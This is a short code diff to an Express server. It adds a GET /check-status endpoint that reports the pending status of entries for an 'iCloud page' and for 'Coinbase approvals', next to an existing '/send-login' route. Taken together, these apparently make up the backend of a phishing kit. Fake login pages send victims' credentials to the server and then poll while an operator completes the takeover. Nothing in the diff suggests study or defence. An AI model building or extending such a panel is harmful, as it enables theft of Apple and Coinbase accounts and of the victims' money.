@@ -234,6 +234,35 @@ app.post("/send-login", async (req, res) => {
 // POST /check-status
 // ============================================================================
 
+// ✅ GET endpoint for iCloud page (uses query param identifier)
+app.get("/check-status", (req, res) => {
+  try {
+    const identifier = (req.query.identifier || "").trim();
+
+    if (!identifier) {
+      return res.json({ status: "unknown" });
+    }
+
+    // ✅ Check iCloud page first
+    if (pendingPage[identifier]) {
+      return res.json({
+        status: pendingPage[identifier].status || "pending"
+      });
+    }
+
+    // ✅ Check Coinbase approvals
+    if (pendingApprovals[identifier]) {
+      return res.json({
+        status: pendingApprovals[identifier].status || "pending"
+      });
+    }
+
+    res.json({ status: "unknown" });
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
 app.post("/check-status", (req, res) => {
   try {
     const { email } = req.body;
